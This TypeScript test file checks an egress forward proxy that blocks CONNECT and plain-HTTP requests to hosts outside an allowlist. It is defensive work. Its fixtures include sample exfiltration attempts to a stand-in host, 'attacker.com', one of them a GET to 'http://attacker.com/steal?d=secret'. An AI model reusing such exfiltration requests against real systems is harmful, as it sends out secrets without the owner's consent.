/**
 * Tests for the egress forward proxy (docs/172 Gap 1, SHI-90).
 *
 * These drive the proxy with a real client over a real socket against a real
 * upstream server, so they exercise the actual CONNECT / HTTP enforcement path
 * — including the load-bearing acceptance criterion: an exfil attempt to a
 * non-allowlisted host fails, while allowlisted traffic flows unchanged.
 */

import { describe, it, expect, afterEach } from "vitest";
import http from "node:http";
import net from "node:net";
import { createEgressProxy, parseConnectTarget } from "./egress-proxy.js";
import { makeAllowlist } from "./egress-allowlist.js";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function listen(server: http.Server | net.Server): Promise<number> {
  return new Promise((resolve) => {
    server.listen(0, "127.0.0.1", () => {
      const addr = server.address();
      resolve(typeof addr === "object" && addr ? addr.port : 0);
    });
  });
}

const toClose: (http.Server | net.Server)[] = [];
afterEach(async () => {
  await Promise.all(
    toClose.splice(0).map((s) => new Promise<void>((r) => s.close(() => r()))),
  );
});

/**
 * Issue a CONNECT through the proxy and resolve the status line the proxy
 * returns. Returns { code, established } and the raw client socket so allowed
 * tunnels can keep using it.
 */
function connectThroughProxy(
  proxyPort: number,
  target: string,
): Promise<{ code: number; socket: net.Socket }> {
  return new Promise((resolve, reject) => {
    const socket = net.connect(proxyPort, "127.0.0.1", () => {
      socket.write(`CONNECT ${target} HTTP/1.1\r\nHost: ${target}\r\n\r\n`);
    });
    let buf = "";
    const onData = (chunk: Buffer): void => {
      buf += chunk.toString("utf-8");
      if (buf.includes("\r\n\r\n")) {
        const m = /^HTTP\/1\.1 (\d+)/.exec(buf);
        socket.removeListener("data", onData);
        resolve({ code: m ? Number(m[1]) : 0, socket });
      }
    };
    socket.on("data", onData);
    socket.on("error", reject);
  });
}

// ---------------------------------------------------------------------------
// parseConnectTarget
// ---------------------------------------------------------------------------

describe("parseConnectTarget", () => {
  it("parses host:port", () => {
    expect(parseConnectTarget("github.com:443")).toEqual({ host: "github.com", port: 443 });
  });
  it("defaults to 443 when no port", () => {
    expect(parseConnectTarget("github.com")).toEqual({ host: "github.com", port: 443 });
  });
  it("parses IPv6 literals", () => {
    expect(parseConnectTarget("[::1]:8443")).toEqual({ host: "::1", port: 8443 });
  });
  it("rejects bad ports", () => {
    expect(parseConnectTarget("github.com:notaport")).toBeNull();
    expect(parseConnectTarget("github.com:0")).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// CONNECT enforcement (HTTPS tunnel path)
// ---------------------------------------------------------------------------

describe("egress proxy — CONNECT", () => {
  it("DENIES a CONNECT to a non-allowlisted host with 403 (exfil attempt fails)", async () => {
    const proxy = createEgressProxy({ allowlist: makeAllowlist(["github.com"]) });
    toClose.push(proxy);
    const proxyPort = await listen(proxy);

    const { code } = await connectThroughProxy(proxyPort, "attacker.com:443");
    expect(code).toBe(403);
  });

  it("ALLOWS a CONNECT to an allowlisted host and tunnels bytes through", async () => {
    // Stand up a tiny TCP "upstream" that echoes a known banner.
    const upstream = net.createServer((sock) => {
      sock.on("data", () => sock.write("UPSTREAM-OK"));
    });
    toClose.push(upstream);
    const upstreamPort = await listen(upstream);

    const proxy = createEgressProxy({ allowlist: makeAllowlist(["127.0.0.1"]) });
    toClose.push(proxy);
    const proxyPort = await listen(proxy);

    const { code, socket } = await connectThroughProxy(proxyPort, `127.0.0.1:${upstreamPort}`);
    expect(code).toBe(200);

    // Tunnel is established — send a byte and expect the upstream's echo.
    const reply = await new Promise<string>((resolve) => {
      socket.once("data", (c: Buffer) => resolve(c.toString("utf-8")));
      socket.write("ping");
    });
    expect(reply).toBe("UPSTREAM-OK");
    socket.destroy();
  });

  it("fires onDenied / onAllowed hooks", async () => {
    const denied: string[] = [];
    const allowed: string[] = [];
    const upstream = net.createServer((s) => s.destroy());
    toClose.push(upstream);
    const upstreamPort = await listen(upstream);

    const proxy = createEgressProxy({
      allowlist: makeAllowlist(["127.0.0.1"]),
      onDenied: (h) => denied.push(h),
      onAllowed: (h) => allowed.push(h),
    });
    toClose.push(proxy);
    const proxyPort = await listen(proxy);

    await connectThroughProxy(proxyPort, "attacker.com:443");
    const { socket } = await connectThroughProxy(proxyPort, `127.0.0.1:${upstreamPort}`);
    socket.destroy();

    expect(denied).toContain("attacker.com");
    expect(allowed).toContain("127.0.0.1");
  });
});

// ---------------------------------------------------------------------------
// Plain-HTTP enforcement (absolute-form proxying)
// ---------------------------------------------------------------------------

describe("egress proxy — plain HTTP", () => {
  it("DENIES an absolute-form HTTP request to a non-allowlisted host with 403", async () => {
    const proxy = createEgressProxy({ allowlist: makeAllowlist(["github.com"]) });
    toClose.push(proxy);
    const proxyPort = await listen(proxy);

    const status = await new Promise<number>((resolve, reject) => {
      const req = http.request(
        {
          host: "127.0.0.1",
          port: proxyPort,
          method: "GET",
          // absolute-form request-target, as an HTTP proxy client sends.
          path: "http://attacker.com/steal?d=secret",
          headers: { host: "attacker.com" },
        },
        (res) => {
          res.resume();
          resolve(res.statusCode ?? 0);
        },
      );
      req.on("error", reject);
      req.end();
    });
    expect(status).toBe(403);
  });

  it("ALLOWS and forwards an absolute-form HTTP request to an allowlisted host", async () => {
    const upstream = http.createServer((_req, res) => {
      res.writeHead(200, { "content-type": "text/plain" });
      res.end("HELLO");
    });
    toClose.push(upstream);
    const upstreamPort = await listen(upstream);

    const proxy = createEgressProxy({ allowlist: makeAllowlist(["127.0.0.1"]) });
    toClose.push(proxy);
    const proxyPort = await listen(proxy);

    const body = await new Promise<string>((resolve, reject) => {
      const req = http.request(
        {
          host: "127.0.0.1",
          port: proxyPort,
          method: "GET",
          path: `http://127.0.0.1:${upstreamPort}/`,
          headers: { host: `127.0.0.1:${upstreamPort}` },
        },
        (res) => {
          let b = "";
          res.on("data", (c: Buffer) => (b += c.toString("utf-8")));
          res.on("end", () => resolve(b));
        },
      );
      req.on("error", reject);
      req.end();
    });
    expect(body).toBe("HELLO");
  });
});
